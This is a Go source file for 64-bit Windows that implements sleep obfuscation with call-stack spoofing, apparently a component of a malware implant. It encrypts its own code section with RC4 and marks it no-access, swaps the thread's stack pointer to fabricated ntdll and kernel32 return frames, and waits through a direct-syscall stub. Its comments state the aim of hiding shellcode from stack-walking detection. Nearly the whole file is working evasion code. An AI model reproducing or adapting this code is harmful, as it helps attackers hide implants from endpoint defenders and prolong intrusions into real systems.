//go:build windows && amd64

package main

// Stack spoofing during sleep obfuscation (amd64 Windows).
//
// spoofedSleep combines three techniques:
//
//  1. Memory encryption — RC4-encrypt .text via SystemFunction032 so the bytes
//     at sleeping-thread frames contain cipher garbage, not recognisable opcodes.
//
//  2. PAGE_NOACCESS — flip .text to NOACCESS so external stack walkers that try
//     to read the frame at [RSP+0] get an access violation instead of shellcode.
//
//  3. Synthetic call stack — asmSpoofedWait swaps the OS thread's RSP to a
//     buffer containing well-known ntdll/kernel32 return addresses before
//     issuing NtWaitForSingleObject, so frames 1+ look like a normal Windows
//     thread-pool wait chain.
//
// Recovery model (avoids the "return to NOACCESS page" problem):
//   A helper goroutine runs NtDelayExecution for the sleep duration, then:
//     a. Restores .text protection (EXECUTE_READ).
//     b. Decrypts .text (RC4, same key = self-inverse).
//     c. Signals the Windows event.
//   Only then does NtWaitForSingleObject return and the stub's 'ret' execute —
//   by which point .text is fully accessible again.

import (
	"encoding/binary"
	"runtime"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// spoofedSleep performs a full stack-spoofed encrypted sleep of duration d.
func spoofedSleep(d time.Duration) {
	base, size := selfTextRegion()
	if base == 0 || size == 0 {
		ntDelay(d)
		return
	}

	// Resolve fake return addresses from ntdll and kernel32.
	rtlFrame, k32Frame := spoofFrameAddrs()
	if rtlFrame == 0 || k32Frame == 0 {
		ntDelay(d)
		return
	}

	// Build the fake call stack buffer.
	//
	// Memory layout (offsets within fakeBuf):
	//   [ 0 .. 55] headroom: CALL will push real-return-addr at fakeRSP-8 = [56]
	//   [56]       = real return addr slot (written by CALL; in NOACCESS .text during sleep)
	//   [64]       = fakeRSP → RtlUserThreadStart+0x21   (first visible fake frame)
	//   [72]                → BaseThreadInitThunk+0x14  (second visible fake frame)
	//   [80]                → 0x0                       (stack-walk terminator)
	const fakeStackSize = 256
	const rspOff = 64 // fakeRSP points here
	fakeBuf := make([]byte, fakeStackSize)
	binary.LittleEndian.PutUint64(fakeBuf[rspOff:], uint64(rtlFrame))
	binary.LittleEndian.PutUint64(fakeBuf[rspOff+8:], uint64(k32Frame))
	binary.LittleEndian.PutUint64(fakeBuf[rspOff+16:], 0)
	fakeRSP := uintptr(unsafe.Pointer(&fakeBuf[rspOff]))

	// Build NtWaitForSingleObject direct-syscall stub (separate VirtualAlloc,
	// NOT inside .text — so the stub stays executable while .text is NOACCESS).
	ssn, err := hgGetSSN("NtWaitForSingleObject")
	if err != nil {
		ntDelay(d)
		return
	}
	waitStub, freeStub, err := hgMakeStub(ssn)
	if err != nil {
		ntDelay(d)
		return
	}
	defer freeStub()

	// Manual-reset event (initially unsignaled) for helper → main coordination.
	hEvent, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		ntDelay(d)
		return
	}
	defer windows.CloseHandle(hEvent)

	// Pin fakeBuf so the GC cannot relocate it during the wait.
	var pin runtime.Pinner
	pin.Pin(&fakeBuf[0])
	defer pin.Unpin()

	// RC4-encrypt .text region to make frame bytes unrecognisable.
	rc4Key := makeRC4Key(base, d)
	rc4KeySlice := rc4Key[:]
	regionKey := ustring{
		Length:        uint16(len(rc4KeySlice)),
		MaximumLength: uint16(len(rc4KeySlice)),
		Buffer:        uintptr(unsafe.Pointer(&rc4KeySlice[0])),
	}
	regionData := ustring{
		Length:        uint16(size),
		MaximumLength: uint16(size),
		Buffer:        base,
	}

	// Flip .text to RW, encrypt, flip to NOACCESS.
	origProtect, err := ntProtectSelf(base, size, pageReadWrite)
	if err != nil {
		ntDelay(d)
		return
	}
	procSystemFunction032.Call(
		uintptr(unsafe.Pointer(&regionData)),
		uintptr(unsafe.Pointer(&regionKey)),
	)
	if _, err := ntProtectSelf(base, size, pageNoAccess); err != nil {
		// Restore before bailing.
		ntProtectSelf(base, size, origProtect) //nolint:errcheck
		ntDelay(d)
		return
	}

	// Helper goroutine: sleep d, restore .text (NOACCESS → decrypt → RX), signal.
	// Must complete the full restore BEFORE SetEvent so that when
	// NtWaitForSingleObject returns and the stub's 'ret' executes, .text is RX.
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		ntDelay(d)

		// Flip NOACCESS → RW, decrypt, flip → original protection.
		ntProtectSelf(base, size, pageReadWrite) //nolint:errcheck
		procSystemFunction032.Call(
			uintptr(unsafe.Pointer(&regionData)),
			uintptr(unsafe.Pointer(&regionKey)),
		)
		ntProtectSelf(base, size, origProtect) //nolint:errcheck

		windows.SetEvent(hEvent) //nolint:errcheck
	}()

	// Lock this goroutine to its OS thread so the spoofed stack is on a
	// deterministic OS thread for the full duration of the wait.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Block with the spoofed call stack.
	asmSpoofedWait(uintptr(hEvent), fakeRSP, waitStub)
}

// spoofFrameAddrs resolves the synthetic return addresses used to populate the
// fake call stack.  The +0x21 / +0x14 offsets land in the middle of the
// function bodies — exactly where StackWalk64 expects valid return addresses.
func spoofFrameAddrs() (rtlUserThreadStart, baseThreadInitThunk uintptr) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	rts := ntdll.NewProc("RtlUserThreadStart")
	bit := k32.NewProc("BaseThreadInitThunk")
	if rts.Find() != nil || bit.Find() != nil {
		return 0, 0
	}
	return rts.Addr() + 0x21, bit.Addr() + 0x14
}

// asmSpoofedWait is implemented in stackspoof_amd64.s.
// It swaps RSP to fakeRSP, calls NtWaitForSingleObject via waitStub,
// then restores RSP after the event is signaled.
//
//go:nosplit
func asmSpoofedWait(hEvent, fakeRSP, waitStub uintptr)
